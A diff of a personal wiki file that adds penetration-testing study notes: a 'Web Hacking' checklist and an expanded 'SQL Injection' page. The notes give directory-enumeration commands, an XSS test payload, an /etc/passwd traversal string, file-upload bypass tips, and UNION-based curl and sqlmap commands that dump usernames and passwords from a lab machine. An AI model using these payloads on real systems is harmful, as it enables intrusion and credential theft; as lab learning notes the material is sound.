@@ -481,6 +481,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Draft of 'LinEnum'</li>
 
+<li>Draft of 'Web Hacking'</li>
+
 <li>Entertainment</li>
 
 <li>Exploitation</li>
@@ -10069,7 +10071,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211120102430043" list="[[Cyber Security]] Pivoting CrappyMakerProgrammer" modified="20211120102431992" title="$:/StoryList">
+<div created="20211120102430043" list="[[Cyber Security]] Exploitation [[Draft of 'Web Hacking']] [[SQL Injection]] CrappyMakerProgrammer" modified="20211120165034104" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11901,6 +11903,91 @@ dig axfr @10.10.10.13 cronos.htb
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
 </div>
+<div created="20210825220712054" draft.of="Web Hacking" draft.title="Web Hacking" modified="20211120165029415" title="Draft of 'Web Hacking'">
+<pre>Steps to web hacking
+
+# Check the source code of all pages
+# `robots.txt`
+# Check cookies
+# Enumerate the directories
+# SQL Inject all possible forms
+# XSS all possible fields
+
+! Directory enumeration
+Basically use a word list to enumerate
+
+```
+dirb &lt;url&gt;
+gobuster dir -k -x html,js,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u &lt;URL&gt;
+```
+
+Look through at log down everything on everypage. Find all clues.
+
+
+!! Tools
+
+!!! Dirb
+
+```
+dirb &lt;url&gt;
+```
+
+Add `-w` to list content in list able directories, `-u &lt;username&gt;:&lt;password&gt;` for authentication. You can add `-h` for more options, like changing the default word list
+
+It is automatically recursive
+
+
+!!! Gobuster
+
+Alternative to dirb. Not automatically recursive
+
+```
+gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt; -x &lt;list of extensions eg. html,js,php&gt;
+```
+
+!!! Dirbuster:
+
+A GUI version of Gobuster. 
+
+! SQL Injection
+
+[[SQL Injection]]
+
+! XSS: Cross Site Scripting
+
+Try putting `&lt;script&gt;alert(1);&lt;/script&gt;` into text boxes. If an alert shows up, an XSS attack works
+
+! Python Flask Injection
+https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
+https://github.com/epinna/tplmap
+
+! Local File Inclusion
+
+https://tryhackme.com/room/lfibasics
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+If there is a POST/GET parameter with a path, you can try Directory inclusion by `../../../../../etc/passwd` or something
+
+# PHP Filters
+# You can try reading from the log file (and inject php code inside)
+
+! File Upload Vulnerability
+
+# Upload a file through website/ FTP if possible
+# Access the payload through the web browser to run the php code
+
+To bypass mandate of extension, can try name.php.jpg for example. It will run as a php file [[*|https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload]]
+
+! ShellShock
+
+! CMS Exploits
+
+[[Network Services]]
+Find more at [[CMS Exploitation]]</pre>
+</div>
 <div created="20191105030432236" modified="20191105034127657" title="Entertainment">
 <pre>! Anime &amp; Manga
 Check [[MyAnimeList|https://myanimelist.net/profile/Hackin7]]
@@ -13302,12 +13389,15 @@ follow symlinks = yes
 wide links = yes
 ```</pre>
 </div>
-<div created="20211101125907368" modified="20211102141026060" title="SQL Injection">
-<pre>https://tryhackme.com/room/sqlinjectionlm
+<div created="20211101125907368" modified="20211120165741791" title="SQL Injection">
+<pre>! Manual SQL Injection
+
+https://tryhackme.com/room/sqlinjectionlm
 https://tryhackme.com/room/sqlilab
 
-```
+Sample queries
 
+```
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=Mary' union select 1,2,3,4,5,6 -- -&quot;
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_schema) FROM information_schema.tables  -- -&quot;
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select distinct 1,2,3,4,5,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'users' -- -&quot;
@@ -13315,7 +13405,36 @@ curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union selec
 
 curl 10.10.10.3/results.php -X POST --data-urlencode &quot;search=0' union select 1,2,3,4,5,group_concat(username,':',password, SEPARATOR '&lt;br&gt;') FROM users.UserDetails -- -&quot;
 
-```</pre>
+```
+
+Useful tables to select
+
+Microsoft SQL
+
+# `all_tables` ...
+
+! SQLMap
+
+From [[here|https://security.stackexchange.com/questions/177287/how-to-include-multiple-parameters-in-sqlmap-post-request]]
+
+GET request
+
+```
+sqlmap -u &quot;http://example.com/?a=1&amp;b=2&amp;c=3&quot; -p &quot;a,b&quot; (--tables /--dump)
+```
+
+POST request
+
+```
+sqlmap -u &quot;http://example.com/&quot; --data &quot;a=1&amp;b=2&amp;c=3&quot; -p &quot;a,b&quot; --method POST (--tables /--dump)
+```
+
+# Whenever you find a user page, bruteforce SQL injection payloads.
+## https://github.com/payloadbox/sql-injection-payload-list
+# If it is something like ?id=1, you can try enumerating all the ids by doing id=2, id=3
+## Can move on to SQL Injection (eg. UNION)
+
+</pre>
 </div>
 <div created="20210810142453194" modified="20210810142954660" title="Stocks">
 <pre>! What are stocks
